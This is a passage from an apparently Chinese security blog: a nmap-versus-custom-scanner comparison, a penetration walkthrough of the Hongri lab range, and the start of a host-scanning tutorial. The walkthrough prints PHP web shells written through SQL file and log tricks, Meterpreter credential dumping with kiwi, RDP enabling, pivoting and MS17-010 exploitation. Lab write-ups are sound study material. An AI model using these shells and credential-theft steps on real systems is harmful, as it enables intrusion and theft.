<h3 id="测试结果"><a class="markdownIt-Anchor" href="#测试结果"></a> 测试结果</h3>
<p>把 fapro 能开的服务全部打开，使用自制扫描器进行服务扫描的结果：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FmS49Qk0YNvgvb_uSXRUclA7ilFH.png" alt="" />
使用 nmap 扫描的结果：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhbEX-Q9HExk0MJ3OiYESfX-pHsy.png" alt="" />
[111,554,1234,1433,1521,3389,5432,7001,8080,8888,9200,20000,49152]这些端口自制扫描器扫不到，以下是原因研究：
首先分析流量，下图是 nmap 扫 554（rtsp）端口的流量（命令：<code>nmap IP -p 554 -sV</code>）：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiqlKJCSNaXru5nAuPJ0b2E1F5Jv.png" alt="" />
发现握手之后，跑 fapro 的 host 会一直发[FIN,ACK]包，想结束这此通信，而跑 nmap 的 host 不甘心，一直发探针，但一直收不到回应，这就是自制扫描器扫不出来的原因，自制扫描器需要根据响应内容进行正则匹配来判断。
nmap 结果：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FscI3BnXh1yQNEErR3AJV4TAGjaf.png" alt="" />
rtsp 后面的“？” 很可疑！
换一个端口跑 rtsp 服务：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fq27ZY4J5hWbKQ0WppyRfzeR7U1Q.png" alt="" />
扫 555 端口 rtsp 服务的 nmap 结果：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FormpTs5yQAvmWq18KZ4bjf4WvLq.png" alt="" />
果然！因为没有响应包，nmap 也不能确认 555 端口跑的具体什么服务，直接根据端口判断成另外一个服务了。
新机子瓦伊多姿，如果响应包内容不在 nmap 的指纹库内，nmap 并不能判断该端口上跑的服务，只是根据端口判断。
到这里，基本可以实现了与 nmap 同等能力的服务识别功能。</p>
<h1 id="改进"><a class="markdownIt-Anchor" href="#改进"></a> 改进</h1>
<ul>
<li>ssl 还没有测试</li>
<li>结果输出未做去重和排序，单纯开线程跑，各种包的响应速度不一样导致结果输出不可控</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://c4ooc0.github.io/2022/07/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1%20kali2022.2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/images.jpg">
      <meta itemprop="name" content="c4ooc0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="c4ooc0个人博客">
      <meta itemprop="description" content="永怀谦卑与求知欲">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | c4ooc0个人博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/07/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1%20kali2022.2/" class="post-title-link" itemprop="url">红日靶场1 kali2022.2</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-07-14 09:06:52" itemprop="dateCreated datePublished" datetime="2022-07-14T09:06:52+08:00">2022-07-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-11-17 10:46:19" itemprop="dateModified" datetime="2022-11-17T10:46:19+08:00">2022-11-17</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>2.3k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>8 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>详细教程<a target="_blank" rel="noopener" href="https://blog.csdn.net/YouthBelief/article/details/120974079">这个博客</a>里已经写的很清楚了，下面只记录一些我的收获和过程
踩了不少坑，仍有未解决的东西，记录我的过程应该也有点参考价值吧</p>
<h1 id="一-环境搭建"><a class="markdownIt-Anchor" href="#一-环境搭建"></a> 一、环境搭建</h1>
<h2 id="1环境搭建测试"><a class="markdownIt-Anchor" href="#1环境搭建测试"></a> 1.环境搭建测试</h2>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15302226/5189485">[WEB 安全]红日靶场（一）环境搭建</a>
有一点小误区，物理机访问 web 时，应用 NAT 的地址
搭建完成后记得测试内网三台机子之间的连通性（之前正常，后来 ping 不通，可以尝试重启）</p>
<h2 id="2信息收集"><a class="markdownIt-Anchor" href="#2信息收集"></a> 2.信息收集</h2>
<p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnDi9PS3wjj_6kR0NE2gm1Vx61T-.png" alt="" /></p>
<ul>
<li>活动主机</li>
</ul>
<p>Netdiscover 是一种网络扫描工具，通过 ARP 扫描发现活动主机，可以通过主动和被动两种模式进行 ARP 扫描。通过主动发送 ARP 请求检查网络 ARP 流量，通过自动扫描模式扫描网络地址。
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hiyong/p/14590209.html">Netdiscover 使用</a></p>
<ul>
<li>端口扫描
<ul>
<li>Masscan</li>
</ul>
</li>
</ul>
<p>masscan 的扫描结果类似于 nmap(一个很著名的端口扫描器)，在内部，它更像 scanrand, unicornscan, and ZMap，采用了异步传输的方式。它和这些扫描器最主要的区别是，它比这些扫描器更快。而且，masscan 更加灵活，它允许自定义任意的地址范和端口范围。
<a target="_blank" rel="noopener" href="https://blog.csdn.net/nex1less/article/details/108195321">Masscan 使用</a></p>
<ul>
<li>nmap</li>
</ul>
<p>（nmap 能扫出来的东西好多
<a target="_blank" rel="noopener" href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap 详细用法</a></p>
<h1 id="二-漏洞利用"><a class="markdownIt-Anchor" href="#二-漏洞利用"></a> 二、漏洞利用</h1>
<h2 id="3漏洞搜索与利用"><a class="markdownIt-Anchor" href="#3漏洞搜索与利用"></a> 3.漏洞搜索与利用</h2>
<p>nmap 确定服务
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fg5gThsZ6nRpYRW1UolP3AUEWsWB.png" alt="" />
御剑目录扫描，主要依赖字典强度，御剑内置了几个字典可以拿来直接用
<a target="_blank" rel="noopener" href="https://github.com/rootphantomer/Blasting_dictionary">目录爆破字典-github</a>
<a target="_blank" rel="noopener" href="https://github.com/foryujian/yjdirscan">github 御剑</a>
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FkHI7p8vaVPcYWA9YnwH2nkXyp4v.png" alt="" />
然后看到 phpmyadmin，爆破用户名密码，登上去</p>
<h2 id="4后台-getshell-上传技巧"><a class="markdownIt-Anchor" href="#4后台-getshell-上传技巧"></a> 4.后台 Getshell 上传技巧</h2>
<p>上传 webshell 有两个难点</p>
<ol>
<li>上传 shell</li>
<li>知道 shell 上传的路径</li>
</ol>
<p>通过 sql，博客提到了两种方法：</p>
<ul>
<li>通过写入文件</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://192.168.143.131/phpmyadmin/url.php?url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Fshow.html&amp;token=ec216890e220ba8ba9bda74b2167b9c7">SHOW</a> <strong>GLOBAL</strong> <strong>VARIABLES</strong> <a target="_blank" rel="noopener" href="http://192.168.143.131/phpmyadmin/url.php?url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Fstring-comparison-functions.html%23operator_like&amp;token=ec216890e220ba8ba9bda74b2167b9c7">LIKE</a> '%secure%'
博客里说“为 NULL 不可写入文件，要想修改 Value 值 只能通过配置文件 mysql.ini 修改”，然后我尝试修改 secure_auth，成功
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhoqzldCNUX5xa0S4Zjj9MiLBTLr.png" alt="" />
但是修改 secure_file_priv 失败，此路确实不通
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FmxO3jAYxTWltVCizaNpwMzXJzmt.png" alt="" />
记录一下通过文件方式上传 shell 的方法</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27; INTO OUTFILE &#x27;/var/www/html/test.php&#x27;#</span><br><span class="line"></span><br><span class="line">select 1,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27; INTO dumpfile &#x27;/var/www/html/test.php&#x27;#</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">区别在于使用outfile时,文件中一行的末尾会自动换行</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>通过全局日志文件</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FrU_T_WPFwqJAoy_sRZziQAtvlaH.png" alt="" />
需要先开启日志功能，根据查询结果可以看到日志路径，但不是可以通过网址访问的路径，于是需要改日志文件的位置，通过 sql 结果可以看到 phpstudy 的路径，直接可以锁定：'C:/phpStudy1/WWW/3.php'，通过 sql 语句<code>SELECT '&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;'</code>上传成功，蚁剑连接</p>
<ol start="3">
<li>使用慢查询日志 getsehll</li>
</ol>
<p>这个<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41821603/article/details/109948920">博客</a>使用了慢日志 getshell
步骤：</p>
<ul>
<li>开启慢日志</li>
<li>指定慢日志存放位置</li>
<li></li>
</ul>
<ol start="4">
<li>
<p>使用错误日志 getshell</p>
</li>
<li>
<p>利用 phpmyadmin4.8.x 本地文件包含漏洞 getshell</p>
</li>
</ol>
<h2 id="5系统信息收集"><a class="markdownIt-Anchor" href="#5系统信息收集"></a> 5.系统信息收集</h2>
<ol>
<li>是否存在域</li>
</ol>
<p>判断方法</p>
<ul>
<li>whoami hostname 对比</li>
<li>ipconfig /all 看 DNS</li>
<li>systeminfo 看是否有域一栏</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45290991/article/details/118539048">这个博客</a>写收集信息更清晰一些，后面的密码收集也写的不错</p>
<ol start="2">
<li>网络连接情况 进程 杀软 服务 是否可以出网 用户开放情况</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ipconfig 看所处网段是否有多个</span><br><span class="line">netstat -ano 查看网络连接和开放端口</span><br><span class="line">net start  查看启动的服务  用于提权</span><br><span class="line">tasklist   查看开启的进程</span><br><span class="line">tasklist /SVC 复制到在线杀软识别 看存在的杀软情况  https://i.hacking8.com/tiquan</span><br><span class="line">ping baidu  看是否可以出网等</span><br><span class="line">net user   存在用户</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>翻看 txt 文件</li>
</ol>
<p>有些博客中还提到 CS，CS 是 Cobalt Strike 的简称，是一款渗透测试神器，常被业界人称为 CS 神器。Cobalt Strike 已经不再使用 MSF 而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。
<a target="_blank" rel="noopener" href="https://blog.csdn.net/zzwwhhpp/article/details/111773395">CS 安装与用法</a>，到官网看了一下，发现需要花钱，然后搜着搜着看到 cs 的免费版本 Armitage，应该是 kali 有自带的，然后发现我的 kali 没有</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/BuNahua/article/details/120037331">在红日靶场 1 中的实例</a></p>
<h2 id="6主机密码收集"><a class="markdownIt-Anchor" href="#6主机密码收集"></a> 6.主机密码收集</h2>
<p>先提权，然后 load kiwi 获得主机密码</p>
<p>遇到问题：
这里运行<code>run hashdump</code>时出现错误：Error: ArgumentError wrong number of arguments (given 4, expected 5) ，暂未找到解决方法。看<a target="_blank" rel="noopener" href="https://blog.hz2016.com/2022/05/%e3%80%90cfs%e3%80%91%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba%e4%b8%80/">这里</a>说报错是由于 kali 的内核版本问题，我用的是当前（2022.5）kali 的最新版本，前面贴出的博客也提到换了旧版就可以执行，这里就不试了。
使用 kiwi 模块时，运行<code>creds_all</code>出错：ActiveRecord（翻译：错误运行命令 creds_all: ActiveRecord::RecordInvalid 验证失败:数据不是&lt;lan manager 十六进制 hash=&quot;&quot;&gt;:&lt;nt lan=&quot;&quot; manager 十六进制摘要=&quot;&quot;&gt;的 NTLMHash 数据格式，其中每个十六进制摘要是 32 个小写的十六进制字符。</nt></lan>）</p>
<p>kiwi
<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46258964/article/details/125210258">内网渗透 Windows 密码凭证获取</a> 只需要看 msf 部分，写的挺清楚的
migrate x64 的进程号后，加载 mimikatz 模块有警告:&quot;The &quot;mimikatz&quot; extension has been replaced by &quot;kiwi&quot;.&quot;，对应<code>mimikatz_command -f sekurlsa::searchPasswords</code>现在需要写成<code>kiwi_cmd sekurlsa::logonpasswords</code>（命令错了会提示合法参数，可以说很贴心了）
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlrEdshhOTUXenDEO5UQckIsNY3z.png" alt="" /></p>
<p>为什么要用 nmap 扫 3389 端口？
3389 是远程桌面服务端口，<code>run post/windows/manage/enable_rdp</code>开启这个端口
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FujZjE9ZS4iPbx_tLvbEQDNvgmnM.png" alt="" />
果然登进来了（先做了下一步内网穿透，不知道有没有关系）</p>
<h1 id="三-内网搜集"><a class="markdownIt-Anchor" href="#三-内网搜集"></a> 三、内网搜集</h1>
<h2 id="7内网继续信息收集"><a class="markdownIt-Anchor" href="#7内网继续信息收集"></a> 7.内网–继续信息收集</h2>
<h3 id="msf-socks4a-proxychains-穿透内网"><a class="markdownIt-Anchor" href="#msf-socks4a-proxychains-穿透内网"></a> msf socks4a proxychains 穿透内网</h3>
<p>这里的思路是先建立攻击机到内网的路由，然后再加一个 sock 代理，使得其他应用也可以访问内网，就可以进一步收集内网信息。
内网信息收集可以参考这个，<a target="_blank" rel="noopener" href="https://blog.csdn.net/YouthBelief/article/details/120974079">红日靶场 1 实战经验</a></p>
<p>问题：
原博客中<code>use auxiliary/server/socks4a </code>找不到了，用了<code>auxiliary/server/socks_proxy</code>代替，可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/117375754">msf 及 socks 代理转发</a>
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fl5RLbVz3odaF-8AHwxEtbHb0O5O.png" alt="" />（可爱）
kali 最新版好像没有 proxychains ，使用 apt-get 安装
然后我发现，<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FldZgayT5Huf-5cUylpBVnNrqToI.png" alt="" />
另开一个窗口，访问内网主机不加 proxychain 反而有用？？
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FgXc88I_WmDzvYkuDxFRx3KzOi3w.png" alt="" />
可能这个 auxiliary/server/socks_proxy 变成全局代理了</p>
<h2 id="8内网攻击姿势信息泄露"><a class="markdownIt-Anchor" href="#8内网攻击姿势信息泄露"></a> 8.内网攻击姿势–信息泄露</h2>
<p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fq7PG-EIinD4dPXtnKcETxuviYel.png" alt="" />
跟着博客扫了永恒之蓝，发现存活的主机 win2003（141），xin2008（138）
使用 发现 Exploit completed, but no session was created
多次重复，发现了更多报错，看网上说是重启靶机，使用 vmware 发现依旧不能成功</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010（Eternal blue 永恒之蓝）</a>
<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29277155/article/details/96865836">计算机病毒命名规则</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/gwruiki/article/details/123807368">漏洞命名规则</a> ms 是微软漏洞库编号，格式：MS 年-编号
尝试利用 ms17-010 反弹 shell</p>
<p>这里渗透失败了，是因为目标机是 32 位系统，而 MSF 内置的漏洞是 64 位的，需要安装 32 位的漏洞，可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/91051614">利用 MS17-010 渗透 win7（32 位）</a>（防火墙拦着我不让我从浏览器下，找了个梯子，挂全局代理，git clone 才下下来）
遇到了一个博主没遇到的问题：</p>
<blockquote>
<p><code>Error sending wrong architecture DLL to target</code></p>
</blockquote>
<p>是 payload 设错了，参考<a target="_blank" rel="noopener" href="https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/issues/17">https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/issues/17</a>，<code>set payload windows/meterpreter/reverse_tcp</code>
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FktBHjOewG9RHv0TMlSREeq0VRDU.png" alt="" />
然后做到这一步，试了好多次都没成功（第二天重新搭环境来了一次，也没出来）
看了原博客中使用的模块介绍，141 是 window2003，不在 target 之内，人傻了
换 payload 试了 138，报“00a0:err:rpc:I_RpcReceive we got fault packet with status 0x1c010003
”，查了半天也没看出来怎么解决。。
所有 ms17-010 都试了一遍，能扫出来，就是 shell 出不来，先放弃了,原因在这个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/14021537.html">博客</a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/14021537.html">https://www.cnblogs.com/yokan/p/14021537.html</a></p>
<p>根据，拿下 141
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiHTuruX5AakcAwGozymd4OvqoTz.png" alt="" />
然后发现卡了很久，，利用永恒之蓝系统容易崩，就当可以了吧</p>
<hr />
<p>目前的进度是拿下 141，没有拿下 138，版本原因各种方法都试了一直有问题，有空再试试吧，有点耽误时间了</p>
<h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2>
<p>官网路线： 10.内网攻击姿势-SMB 远程桌面口令猜测</p>
<p>11.内网攻击姿势-Oracle 数据库 TNS 服务漏洞 12.内网攻击姿势-RPC DCOM 服务漏洞</p>
<p>四、横向移动 13.内网其它主机端口-文件读取 14.内网其它主机端口-redis 15.内网其它主机端口-redis Getshell 16.内网其它主机端口-MySQL 数据库 17.内网其它主机端口-MySQL 提权</p>
<p>五、构建通道 18.内网其它主机端口-代理转发</p>
<p>六、持久控制 19.域渗透-域成员信息收集 20.域渗透-基础服务弱口令探测及深度利用之 powershell 21.域渗透-横向移动[wmi 利用] 22.域渗透-C2 命令执行 23.域渗透-利用 DomainFronting 实现对 beacon 的深度隐藏 24.域渗透-域控实现与利用</p>
<p>七、痕迹清理
25、日志清理</p>
<p>可以看到想进目标内网，需要先再外网打点，找到目标单位的外网服务站点、主机漏洞，并获得 Shell，再借助外网服务器当跳板机访问目标内网。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://c4ooc0.github.io/2022/07/14/%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF%E5%B0%8F%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/images.jpg">
      <meta itemprop="name" content="c4ooc0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="c4ooc0个人博客">
      <meta itemprop="description" content="永怀谦卑与求知欲">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | c4ooc0个人博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/07/14/%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF%E5%B0%8F%E8%AE%B0/" class="post-title-link" itemprop="url">扫描技术小记</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-07-14 08:55:56" itemprop="dateCreated datePublished" datetime="2022-07-14T08:55:56+08:00">2022-07-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-11-17 10:46:22" itemprop="dateModified" datetime="2022-11-17T10:46:22+08:00">2022-11-17</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>3.8k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>14 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>文章大量内容参考了这本书：</p>
<p>内容不是很深，语言清晰易懂，看起来不太费劲，但颇有收获
还有 NMAP 参考指南：</p>
<p>对于 NMAP 的使用方法介绍了很多，但原理不是很清晰</p>
<hr />
<h1 id="c-段扫描"><a class="markdownIt-Anchor" href="#c-段扫描"></a> C 段扫描</h1>
<p>C 段指的是同一内网段内的其他服务器，每个 IP 有 ABCD 四个段，举个例子，192.168.0.1，A 段就是 192，B 段是 168，C 段是 0，D 段是 1，而 C 段嗅探的意思就是拿下它同一 C 段中的其中一台服务器，也就是说是 D 段 1-255 中的一台服务器，然后利用工具嗅探拿下该服务器。</p>
<h2 id="ping"><a class="markdownIt-Anchor" href="#ping"></a> ping</h2>
<p>1、主机可达
发送一个 type = 8,code = 0 的 ICMP Request 包，表示这是一个请求包，如果顺利的到达对应的主机，主机会发送一个 type = 0，code = 0 的 ICMP Reply 包。
如果发送方收到 Reply 包，就说明主机可达。</p>
<p>2、主机不可达
发送一个 type = 8,code = 0 的 ICMP Request 包，如果路由器中不存在到达目的 IP 的路由的时候，会返回一个 type = 3，code = 1 的 ICMP 包，表示主机不可达。
当发送方收到包后，发现 type = 3， code = 1，说明主机不可达</p>
<p>下面的是基于 bash 脚本，根据 ping 命令的输出来判断主机可不可达：
<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43623271/article/details/122113368">参考博客：ping 命令脚本</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> == <span class="string">&quot;&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;need an ip address&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">for</span> ip <span class="keyword">in</span> `<span class="built_in">seq</span> 1 254`; <span class="keyword">do</span></span><br><span class="line">		ping -c 1 <span class="variable">$1</span>.<span class="variable">$ip</span> | grep <span class="string">&quot;64 bytes&quot;</span> | <span class="built_in">cut</span> -d <span class="string">&quot; &quot;</span> -f 4 | <span class="built_in">tr</span> -d <span class="string">&quot;:&quot;</span> &amp;</span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>该脚本支持并行，速度很快
<strong>缺陷</strong>
如果目标主机禁用 icmp 回显请求，就该方法失效。可以使用其他方法探测，接下来介绍基于 tcp 的探测方法。</p>
<h2 id="tcp-ack"><a class="markdownIt-Anchor" href="#tcp-ack"></a> tcp ack</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gongheng1125/article/details/51219404">主机存活探测方式</a>
上面的博客介绍了很多探测方式，这里使用 ack 包进行测试</p>
<ul>
<li>若主机可达，则收到 RST 响应包。向目标主机发送 ACK 包，但目标主机并没有给本机发送 SYN 包表示要建立连接，而本机直接构造发送了 ACK 包表示同意连接，目标主机就会向我们回复 RST 数据包，表示不在线拒绝连接</li>
<li>若主机不可达，则不会收到响应包</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dport = random.randint(<span class="number">1</span>, <span class="number">65535</span>)	<span class="comment">#随机目的端口</span></span><br><span class="line">        packet = IP(dst=ip)/TCP(flags=<span class="string">&quot;A&quot;</span>,dport=dport)	<span class="comment">#构造标志位为ACK的数据包</span></span><br><span class="line">        response = sr1(packet,timeout=<span class="number">0.5</span>, verbose=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(response[TCP].flags) == <span class="number">4</span>:		<span class="comment">#判断响应包中是否存在RST标志位</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Host: %s on line&quot;</span> % ip)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    usage = <span class="string">&quot;Usage: %prog -f &lt;filename&gt; -i &lt;ip address&gt;&quot;</span>	<span class="comment"># 输出帮助信息</span></span><br><span class="line">    parse = OptionParser(usage=usage)</span><br><span class="line">    parse.add_option(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>, dest=<span class="string">&quot;filename&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;specify the IP address file&quot;</span>)	<span class="comment"># 获取ip地址问及</span></span><br><span class="line">    parse.add_option(<span class="string">&quot;-i&quot;</span>, <span class="string">&#x27;--ip&#x27;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>, dest=<span class="string">&quot;address&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;specify the IP address&quot;</span>)	<span class="comment"># 获取网段地址</span></span><br><span class="line">    option, args = parse.parse_args()	<span class="comment">#实例化用户输入的参数</span></span><br><span class="line">    filename = option.filename</span><br><span class="line">    address = option.address</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] The TCP ACK SCAN start&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filename:	<span class="comment"># 判断用户输出的参数是否为读取ip地址文件，并判断文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;The file does not exist. 